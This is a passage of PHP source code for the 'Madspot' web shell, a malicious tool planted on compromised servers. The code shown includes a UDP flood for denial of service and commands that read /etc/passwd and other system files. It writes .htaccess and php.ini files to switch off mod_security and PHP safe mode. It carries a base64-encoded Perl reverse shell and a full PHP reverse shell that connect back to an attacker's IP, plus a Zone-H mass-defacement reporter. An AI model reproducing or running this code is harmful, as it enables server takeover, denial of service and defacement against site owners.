<span class="x">      echo &#39;&amp;lt;center&amp;gt;&amp;lt;span&amp;gt;| UDP DOSSIER |&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;form onSubmit=&quot;g(null,null,this.udphost.value,this.udptime.value,this.udpport.value); return false;&quot; method=POST&amp;gt;&amp;lt;span&amp;gt;Host :&amp;lt;/span&amp;gt;&amp;lt;input name=&quot;udphost&quot; type=&quot;text&quot;  size=&quot;25&quot; /&amp;gt;&amp;lt;span&amp;gt;Time :&amp;lt;/span&amp;gt;&amp;lt;input name=&quot;udptime&quot; type=&quot;text&quot; size=&quot;15&quot; /&amp;gt;&amp;lt;span&amp;gt;Port :&amp;lt;/span&amp;gt;&amp;lt;input name=&quot;udpport&quot; type=&quot;text&quot; size=&quot;10&quot; /&amp;gt;&amp;lt;input  type=&quot;submit&quot; value=&quot;&amp;gt;&amp;gt;&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&#39;;</span>
<span class="x">      echo &quot;&amp;lt;pre class=&#39;ml1&#39; style=&#39;&quot;.(empty($_POST[&#39;p1&#39;])?&#39;display:none;&#39;:&#39;&#39;).&quot;margin-top:5px&#39; &amp;gt;&quot;;</span>
<span class="x">        if(!empty($_POST[&#39;p1&#39;]) &amp;&amp; !empty($_POST[&#39;p2&#39;]) &amp;&amp; !empty($_POST[&#39;p3&#39;]))</span>
<span class="x">        {</span>
<span class="x">             $packets=0;</span>
<span class="x">            ignore_user_abort(true);</span>
<span class="x">            $exec_time=$_POST[&#39;p2&#39;];</span>
<span class="x">            $time=time();</span>
<span class="x">            $max_time=$exec_time+$time;</span>
<span class="x">            $host=$_POST[&#39;p1&#39;];</span>
<span class="x">            $portudp=$_POST[&#39;p3&#39;];</span>
<span class="x">            for($i=0;$i&amp;lt;65000;$i++)</span>
<span class="x">            {</span>
<span class="x">                $out .= &#39;X&#39;;</span>
<span class="x">            }</span>
<span class="x">            while(1){</span>

<span class="x">             $packets++;</span>
<span class="x">                if(time() &amp;gt; $max_time){</span>
<span class="x">                        break;</span>
<span class="x">                }</span>

<span class="x">                $fp = fsockopen(&#39;udp://&#39;.$host, $portudp, $errno, $errstr, 5);</span>
<span class="x">                if($fp){</span>
<span class="x">                        fwrite($fp, $out);</span>
<span class="x">                        fclose($fp);</span>
<span class="x">                }</span>
<span class="x">                }</span>
<span class="x">             echo &quot;$packets (&quot; . round(($packets*65)/1024, 2) . &quot; MB) packets averaging &quot;. round($packets/$exec_time, 2) . &quot; packets per second&quot;;</span>
<span class="x">             echo &quot;&amp;lt;/pre&amp;gt;&quot;;</span>
<span class="x">        }</span>

<span class="x">        echo &#39;&amp;lt;/div&amp;gt;&#39;;</span>

<span class="x">        madfooter();</span>
<span class="x">    }</span>

<span class="x">    function madproc()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>
<span class="x">        echo &quot;&amp;lt;Div class=header&amp;gt;&amp;lt;center&amp;gt;&quot;;</span>
<span class="x">        if(empty($_POST[&#39;ajax&#39;])&amp;&amp;!empty($_POST[&#39;p1&#39;]))</span>
<span class="x">      $_SESSION[md5($_SERVER[&#39;HTTP_HOST&#39;]).&#39;ajax&#39;] = false;</span>
<span class="x">      if($GLOBALS[&#39;sys&#39;]==&quot;win&quot;)</span>
<span class="x">      {</span>
<span class="x">        $process=array(</span>
<span class="x">        &quot;System Info&quot; =&amp;gt;&quot;systeminfo&quot;,</span>
<span class="x">        &quot;Active Connections&quot; =&amp;gt; &quot;netstat -an&quot;,</span>
<span class="x">            &quot;Running Services&quot; =&amp;gt; &quot;net start&quot;,</span>
<span class="x">            &quot;User Accounts&quot; =&amp;gt; &quot;net user&quot;,</span>
<span class="x">            &quot;Show Computers&quot; =&amp;gt; &quot;net view&quot;,</span>
<span class="x">        &quot;ARP Table&quot; =&amp;gt; &quot;arp -a&quot;,</span>
<span class="x">        &quot;IP Configuration&quot; =&amp;gt; &quot;ipconfig /all&quot;</span>
<span class="x">        );</span>
<span class="x">        }</span>
<span class="x">      else</span>
<span class="x">      {</span>
<span class="x">        $process=array(</span>
<span class="x">        &quot;Process status&quot; =&amp;gt; &quot;ps aux&quot;,</span>
<span class="x">        &quot;Syslog&quot; =&amp;gt;&quot;cat  /etc/syslog.conf&quot;,</span>
<span class="x">        &quot;Resolv&quot; =&amp;gt; &quot;cat  /etc/resolv.conf&quot;,</span>
<span class="x">        &quot;Hosts&quot; =&amp;gt;&quot;cat /etc/hosts&quot;,</span>
<span class="x">        &quot;Passwd&quot; =&amp;gt;&quot;cat /etc/passwd&quot;,</span>
<span class="x">        &quot;Cpuinfo&quot;=&amp;gt;&quot;cat /proc/cpuinfo&quot;,</span>
<span class="x">        &quot;Version&quot;=&amp;gt;&quot;cat /proc/version&quot;,</span>
<span class="x">        &quot;Sbin&quot;=&amp;gt;&quot;ls -al /usr/sbin&quot;,</span>
<span class="x">        &quot;Interrupts&quot;=&amp;gt;&quot;cat /proc/interrupts&quot;,</span>
<span class="x">        &quot;lsattr&quot;=&amp;gt;&quot;lsattr -va&quot;,</span>
<span class="x">        &quot;Uptime&quot;=&amp;gt;&quot;uptime&quot;,</span>
<span class="x">        &quot;Fstab&quot; =&amp;gt;&quot;cat /etc/fstab&quot;,</span>
<span class="x">        &quot;HDD Space&quot; =&amp;gt; &quot;df -h&quot;</span>
<span class="x">        );}</span>

<span class="x">        foreach($process as $n =&amp;gt; $link)</span>
<span class="x">        {</span>
<span class="x">            echo &#39;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(null,null,\&#39;&#39;.$link.&#39;\&#39;)&quot;&amp;gt; | &#39;.$n.&#39; | &amp;lt;/a&amp;gt;&#39;;</span>
<span class="x">        }</span>
<span class="x">        echo &quot;&amp;lt;/center&amp;gt;&quot;;</span>
<span class="x">         if(!empty($_POST[&#39;p1&#39;]))</span>
<span class="x">         {</span>
<span class="x">            echo &quot;&amp;lt;pre class=&#39;ml1&#39; style=&#39;margin-top:5px&#39; &amp;gt;&quot;;</span>
<span class="x">            echo madEx($_POST[&#39;p1&#39;]);</span>
<span class="x">            echo &#39;&amp;lt;/pre&amp;gt;&#39;;</span>
<span class="x">         }</span>
<span class="x">         echo &quot;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">         madfooter();</span>
<span class="x">         }</span>

<span class="x">    function madsafe()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>
<span class="x">        echo &quot;&amp;lt;div class=header&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl =&amp;gt; *.sh  ] files create in following dir&amp;lt;br&amp;gt;| &quot;.$GLOBALS[&#39;cwd&#39;].&quot; |&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">        echo &#39;&amp;lt;a href=# onclick=&quot;g(null,null,\&#39;php.ini\&#39;,null)&quot;&amp;gt;| PHP.INI | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,null,\&#39;ini\&#39;)&quot;&amp;gt;| .htaccess(Mod) | &amp;lt;/a&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,null,null,\&#39;sh\&#39;)&quot;&amp;gt;| .htaccess(perl) | &amp;lt;/a&amp;gt;&amp;lt;/center&amp;gt;&#39;;</span>
<span class="x">        if(!empty($_POST[&#39;p2&#39;]) &amp;&amp; isset($_POST[&#39;p2&#39;]))</span>
<span class="x">        {</span>
<span class="x">        $fil=fopen($GLOBALS[&#39;cwd&#39;].&quot;.htaccess&quot;,&quot;w&quot;);</span>
<span class="x">        fwrite($fil,&#39;&amp;lt;IfModule mod_security.c&amp;gt;</span>
<span class="x">    Sec------Engine Off</span>
<span class="x">    Sec------ScanPOST Off</span>
<span class="x">    &amp;lt;/IfModule&amp;gt;&#39;);</span>
<span class="x">        fclose($fil);</span>
<span class="x">       }</span>
<span class="x">       if(!empty($_POST[&#39;p1&#39;])&amp;&amp; isset($_POST[&#39;p1&#39;]))</span>
<span class="x">       {</span>
<span class="x">        $fil=fopen($GLOBALS[&#39;cwd&#39;].&quot;php.ini&quot;,&quot;w&quot;);</span>
<span class="x">          fwrite($fil,&#39;safe_mode=OFF</span>
<span class="x">    disable_functions=NONE&#39;);</span>
<span class="x">         fclose($fil);</span>
<span class="x">        }</span>
<span class="x">        if(!empty($_POST[&#39;p3&#39;]) &amp;&amp; isset($_POST[&#39;p3&#39;]))</span>
<span class="x">        {</span>
<span class="x">        $fil=fopen($GLOBALS[&#39;cwd&#39;].&quot;.htaccess&quot;,&quot;w&quot;);</span>
<span class="x">        fwrite($fil,&#39;Options FollowSymLinks MultiViews Indexes ExecCGI</span>
<span class="x">    AddType application/x-httpd-cgi .sh</span>
<span class="x">    AddHandler cgi-script .pl</span>
<span class="x">    AddHandler cgi-script .pl&#39;);</span>
<span class="x">         fclose($fil);</span>
<span class="x">        }</span>
<span class="x">        echo &quot;&amp;lt;br&amp;gt;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">        madfooter();</span>

<span class="x">    }</span>

<span class="x">    function madconnect()</span>
<span class="x">    {</span>
<span class="x">     madhead();</span>
<span class="x">     $back_connect_p=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7&quot;;</span>
<span class="x">     echo &quot;&amp;lt;div class=header&amp;gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;| PERL AND PHP(threads) BACK CONNECT |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;&quot;;</span>
<span class="x">     echo &quot;&amp;lt;form  onSubmit=\&quot;g(null,null,&#39;bcp&#39;,this.server.value,this.port.value);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;PERL BACK CONNECT&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;IP: &amp;lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;] .&quot;&#39;&amp;gt; Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;443&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;;</span>
<span class="x">     echo &quot;&amp;lt;br&amp;gt;&amp;lt;form  onSubmit=\&quot;g(null,null,&#39;php&#39;,this.server.value,this.port.value);return false;\&quot;&amp;gt;&amp;lt;span&amp;gt;PHP BACK CONNECT&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;IP: &amp;lt;input type=&#39;text&#39; name=&#39;server&#39; value=&#39;&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;] .&quot;&#39;&amp;gt; Port: &amp;lt;input type=&#39;text&#39; name=&#39;port&#39; value=&#39;443&#39;&amp;gt; &amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&quot;;</span>
<span class="x">     if(isset($_POST[&#39;p1&#39;])) {</span>
<span class="x">                    function cf($f,$t) {</span>
<span class="x">                            $w = @fopen($f,&quot;w&quot;) or @function_exists(&#39;file_put_contents&#39;);</span>
<span class="x">                            if($w){</span>
<span class="x">                                    @fwrite($w,@base64_decode($t));</span>
<span class="x">                                    @fclose($w);</span>
<span class="x">                            }</span>
<span class="x">                    }</span>
<span class="x">                    if($_POST[&#39;p1&#39;] == &#39;bcp&#39;) {</span>
<span class="x">                            cf(&quot;/tmp/bc.pl&quot;,$back_connect_p);</span>
<span class="x">                            $out = madEx(&quot;perl /tmp/bc.pl &quot;.$_POST[&#39;p2&#39;].&quot; &quot;.$_POST[&#39;p3&#39;].&quot; 1&amp;gt;/dev/null 2&amp;gt;&amp;1 &amp;&quot;);</span>
<span class="x">                            echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;Successfully opened reverse shell to &quot;.$_POST[&#39;p2&#39;].&quot;:&quot;.$_POST[&#39;p3&#39;].&quot;&amp;lt;br&amp;gt;Connecting...&amp;lt;/pre&amp;gt;&quot;;</span>
<span class="x">                @unlink(&quot;/tmp/bc.pl&quot;);</span>
<span class="x">                    }</span>
<span class="x">            if($_POST[&#39;p1&#39;]==&#39;php&#39;)</span>
<span class="x">     {</span>

<span class="x">    @set_time_limit (0);</span>
<span class="x">    $ip = $_POST[&#39;p2&#39;];</span>
<span class="x">    $port =$_POST[&#39;p3&#39;];</span>
<span class="x">    $chunk_size = 1400;</span>
<span class="x">    $write_a = null;</span>
<span class="x">    $error_a = null;</span>
<span class="x">    $shell = &#39;uname -a; w; id; /bin/sh -i&#39;;</span>
<span class="x">    $daemon = 0;</span>
<span class="x">    $debug = 0;</span>
<span class="x">    echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&quot;;</span>

<span class="x">    if (function_exists(&#39;pcntl_fork&#39;)) {</span>

<span class="x">            $pid = pcntl_fork();</span>

<span class="x">            if ($pid == -1) {</span>
<span class="x">                    echo &quot;Cant fork!&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    exit(1);</span>
<span class="x">            }</span>

<span class="x">            if ($pid) {</span>
<span class="x">                    exit(0);  </span>
<span class="x">            }</span>

<span class="x">            if (posix_setsid() == -1) {</span>
<span class="x">                    echo &quot;Error: Can&#39;t setsid()&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    exit(1);</span>
<span class="x">            }</span>

<span class="x">            $daemon = 1;</span>
<span class="x">    } else {</span>
<span class="x">            echo &quot;WARNING: Failed to daemonise.  This is quite common and not fatal&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">    }</span>

<span class="x">    chdir(&quot;/&quot;);</span>

<span class="x">    umask(0);</span>

<span class="x">    $sock = fsockopen($ip, $port, $errno, $errstr, 30);</span>
<span class="x">    if (!$sock) {</span>
<span class="x">            echo &quot;$errstr ($errno)&quot;;</span>
<span class="x">            exit(1);</span>
<span class="x">    }</span>


<span class="x">    $descriptorspec = array(</span>
<span class="x">       0 =&amp;gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span>
<span class="x">       1 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span>
<span class="x">       2 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span>
<span class="x">    );</span>

<span class="x">    $process = proc_open($shell, $descriptorspec, $pipes);</span>

<span class="x">    if (!is_resource($process)) {</span>
<span class="x">            echo &quot;ERROR: Can&#39;t spawn shell&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">            exit(1);</span>
<span class="x">    }</span>


<span class="x">    @stream_set_blocking($pipes[0], 0);</span>
<span class="x">    @stream_set_blocking($pipes[1], 0);</span>
<span class="x">    @stream_set_blocking($pipes[2], 0);</span>
<span class="x">    @stream_set_blocking($sock, 0);</span>

<span class="x">    echo &quot;Successfully opened reverse shell to $ip:$port&amp;lt;br&amp;gt;&quot;;</span>

<span class="x">    while (1) {</span>
<span class="x">            if (feof($sock)) {</span>
<span class="x">                    echo &quot;ERROR: Shell connection terminated&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    break;</span>
<span class="x">            }</span>

<span class="x">            if (feof($pipes[1])) {</span>
<span class="x">                    echo &quot;ERROR: Shell process terminated&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    break;</span>
<span class="x">            }</span>


<span class="x">            $read_a = array($sock, $pipes[1], $pipes[2]);</span>
<span class="x">            $num_changed_sockets=@stream_select($read_a, $write_a, $error_a, null);</span>

<span class="x">            if (in_array($sock, $read_a)) {</span>
<span class="x">                    if ($debug) echo &quot;SOCK READ&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    $input=fread($sock, $chunk_size);</span>
<span class="x">                    if ($debug) echo &quot;SOCK: $input&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    fwrite($pipes[0], $input);</span>
<span class="x">            }</span>

<span class="x">            if (in_array($pipes[1], $read_a)) {</span>
<span class="x">                    if ($debug) echo &quot;STDOUT READ&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    $input = fread($pipes[1], $chunk_size);</span>
<span class="x">                    if ($debug) echo &quot;STDOUT: $input&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    fwrite($sock, $input);</span>
<span class="x">            }</span>


<span class="x">            if (in_array($pipes[2], $read_a)) {</span>
<span class="x">                    if ($debug) echo &quot;STDERR READ&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    $input = fread($pipes[2], $chunk_size);</span>
<span class="x">                    if ($debug) echo &quot;STDERR: $input&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                    fwrite($sock, $input);</span>
<span class="x">            }</span>
<span class="x">    }</span>

<span class="x">    fclose($sock);</span>
<span class="x">    fclose($pipes[0]);</span>
<span class="x">    fclose($pipes[1]);</span>
<span class="x">    fclose($pipes[2]);</span>
<span class="x">    proc_close($process);</span>

<span class="x">    echo &quot;&amp;lt;/pre&amp;gt;&quot;;</span>
<span class="x">    }</span>

<span class="x">    }  </span>
<span class="x">     echo &quot;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">     madfooter();</span>
<span class="x">    }</span>
<span class="x">    function ZoneH($url, $hacker, $hackmode,$reson, $site )</span>
<span class="x">    {</span>
<span class="x">            $k = curl_init();</span>
<span class="x">            curl_setopt($k, CURLOPT_URL, $url);</span>
<span class="x">            curl_setopt($k,CURLOPT_POST,true);</span>
<span class="x">            curl_setopt($k, CURLOPT_POSTFIELDS,&quot;defacer=&quot;.$hacker.&quot;&amp;domain1=&quot;. $site.&quot;&amp;hackmode=&quot;.$hackmode.&quot;&amp;reason=&quot;.$reson);</span>
<span class="x">            curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);</span>
<span class="x">            curl_setopt($k, CURLOPT_RETURNTRANSFER, true);</span>
<span class="x">            $kubra = curl_exec($k);</span>
<span class="x">            curl_close($k);</span>
<span class="x">            return $kubra;</span>
<span class="x">    }</span>
<span class="x">    function madzoneh()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>
<span class="x">        if(!function_exists(&#39;curl_version&#39;))</span>
<span class="x">        {</span>
<span class="x">            echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;font color=red&amp;gt;PHP CURL NOT EXIT&amp;lt;/font&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/pre&amp;gt;&quot;;</span>
<span class="x">        }</span>
<span class="x">        echo &quot;&amp;lt;div class=header&amp;gt;&amp;lt;center&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">        echo &#39;&amp;lt;h3&amp;gt;&amp;lt;span&amp;gt;|ZONE-H MASS DEFACER |&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;</span>
<span class="x">       &amp;lt;form  onSubmit=&quot;g(null,null,this.defacer.value,this.hackmode.value,this.domain.value);return false;&quot; &amp;gt;</span>
<span class="x">       &amp;lt;span&amp;gt;| Notifier |&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;text&quot; name=defacer size=&quot;40&quot; value=&quot;Attacker&quot; /&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;select name=hackmode&amp;gt;</span>
<span class="x">    &amp;lt;option &amp;gt;--------SELECT--------&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;1&quot;&amp;gt;known vulnerability (i.e. unpatched system)&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;2&quot; &amp;gt;undisclosed (new) vulnerability&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;3&quot; &amp;gt;configuration / admin. mistake&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;4&quot; &amp;gt;brute force attack&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;5&quot; &amp;gt;social engineering&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;6&quot; &amp;gt;Web Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;7&quot; &amp;gt;Web Server external module intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;8&quot; &amp;gt;Mail Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;9&quot; &amp;gt;FTP Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;10&quot; &amp;gt;SSH Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;11&quot; &amp;gt;Telnet Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;12&quot; &amp;gt;RPC Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;13&quot; &amp;gt;Shares misconfiguration&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;14&quot; &amp;gt;Other Server intrusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;15&quot; &amp;gt;SQL Injection&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;16&quot; &amp;gt;URL Poisoning&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;17&quot; &amp;gt;File Inclusion&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;18&quot; &amp;gt;Other Web Application bug&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;19&quot; &amp;gt;Remote administrative panel access bruteforcing&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;20&quot; &amp;gt;Remote administrative panel access password guessing&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;21&quot; &amp;gt;Remote administrative panel access social engineering&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;22&quot; &amp;gt;Attack against administrator(password stealing/sniffing)&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;23&quot; &amp;gt;Access credentials through Man In the Middle attack&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;24&quot; &amp;gt;Remote service password guessing&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;25&quot; &amp;gt;Remote service password bruteforce&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;26&quot; &amp;gt;Rerouting after attacking the Firewall&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;27&quot; &amp;gt;Rerouting after attacking the Router&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;28&quot; &amp;gt;DNS attack through social engineering&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;29&quot; &amp;gt;DNS attack through cache poisoning&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;30&quot; &amp;gt;Not available&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;select  &amp;gt;</span>
<span class="x">    &amp;lt;option &amp;gt;Not available&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;1&quot; &amp;gt;Heh...just for fun!&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;2&quot; &amp;gt;Revenge against that website&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;3&quot; &amp;gt;Political reasons&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;4&quot; &amp;gt;As a challenge&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;5&quot; &amp;gt;I just want to be the best defacer&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;6&quot; &amp;gt;Patriotism&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;option value=&quot;7&quot; &amp;gt;Not available&amp;lt;/option&amp;gt;</span>
<span class="x">    &amp;lt;/select&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;textarea name=domain cols=&quot;50&quot; rows=&quot;15&quot;&amp;gt;List Of Domains&amp;lt;/textarea&amp;gt;</span>
<span class="x">    &amp;lt;br&amp;gt;</span>
<span class="x">    &amp;lt;input type=&quot;submit&quot; value=&quot;&amp;gt;&amp;gt;&quot; /&amp;gt;&amp;lt;/form&amp;gt;&#39;;</span>
<span class="x">    if(isset($_POST[&#39;p1&#39;]) &amp;&amp; isset($_POST[&#39;p2&#39;]))</span>
<span class="x">    {</span>
<span class="x">        $hacker =$_POST[&#39;p1&#39;];</span>
<span class="x">        $method =$_POST[&#39;p2&#39;];</span>
<span class="x">        $neden =&quot;Not available&quot;;</span>
<span class="x">        $site =$_POST[&#39;p3&#39;];</span>
<span class="x">       $i = 0;</span>
<span class="x">       $sites = explode(&quot;\n&quot;, $site);</span>
<span class="x">       echo &quot;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&quot;;</span>
<span class="x">            while($i &amp;lt; count($sites))</span>
<span class="x">            {</span>
<span class="x">            if(substr($sites[$i], 0, 4) != &quot;http&quot;)</span>
<span class="x">            {</span>
<span class="x">                            $sites[$i] = &quot;http://&quot;.$sites[$i];</span>
<span class="x">            }</span>
<span class="x">            ZoneH(&quot;http://zone-h.org/notify/single&quot;, $hacker, $method, $neden, $sites[$i]);</span>
<span class="x">            echo &quot;Site : &quot;.$sites[$i].&quot; Defaced !&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">            ++$i;</span>
<span class="x">            }</span>

<span class="x">        &quot;Sending Sites To Zone-H Has Been Completed Successfully !! &amp;lt;/pre&amp;gt;&quot;;</span>
<span class="x">    }</span>
<span class="x">    echo &quot;&amp;lt;/div&amp;gt;&quot;;</span>
<span class="x">    madfooter();</span>

<span class="x">    }</span>
<span class="x">    function madspot()</span>
<span class="x">    {</span>
<span class="x">        madhead();</span>
<span class="x">        echo &quot;&amp;lt;div class=header&amp;gt;&quot;;</span>
<span class="x">        echo &quot;&amp;lt;pre&amp;gt;</span>

<span class="x">                              |`-:_</span>
<span class="x">     ,----....____            |    `+.</span>
<span class="x">    (             ````----....|___   |</span>
<span class="x">     \     _                      ````----....____</span>
<span class="x">      \    _)  Coded By: Ikram Ali                ```---.._</span>
<span class="x">       \                                                   \</span>
<span class="x">     )`.\  )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )`.   )hh</span>
<span class="x">    -&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `-&#39;   `</span>
<span class="x">      Madspot is a Team of professional Ethical Hackers From Pakistan.</span>
<span class="x">      We have Years of  Experience in  Security, Penetration &amp; Coding</span>
<span class="x">      And can Break and Secure.</span>

<span class="x">      Version 1.0</span>

<span class="x">      Contact : http://www.madspot.net</span>

<span class="x">      if you found bug contact our team</span>




<span class="x">                 .=&#39;&#39;=.</span>
<span class="x">                / _  _ \</span>
<span class="x">               |  d  b  |</span>
<span class="x">               \   /\   /</span>
<span class="x">              ,/&#39;-=\/=-&#39;\,</span>
<span class="x">             / /        \ \     -----------------------------</span>
<span class="x">            | / Zahid    \ |    Madspot Digital Security Team</span>
<span class="x">            \/ \ Rasheed/ \/    -----------------------------</span>
<span class="x">                &#39;.    .&#39;</span>
<span class="x">                _|`~~`|_</span>
<span class="x">                /|\  /|\</span>

<span class="x">          .- &amp;lt;O&amp;gt; -.        .-====-.      ,-------.      .-=&amp;lt;&amp;gt;=-.</span>
<span class="x">      /_-\&#39;&#39;&#39;/-_\      / / &#39;&#39; \ \     |,-----.|     /__----__\</span>
<span class="x">     |/  o) (o  \|    | | &#39;)(&#39; | |   /,&#39;-----&#39;.\   |/ (&#39;)(&#39;) \|</span>
<span class="x">      \   ._.   /      \ \    / /   {_/(&#39;) (&#39;)\_}   \   __   /</span>
<span class="x">      ,&amp;gt;-_,,,_-&amp;lt;.       &amp;gt;&#39;=jf=&#39;&amp;lt;     `.   _   .&#39;    ,&#39;--__--&#39;.</span>
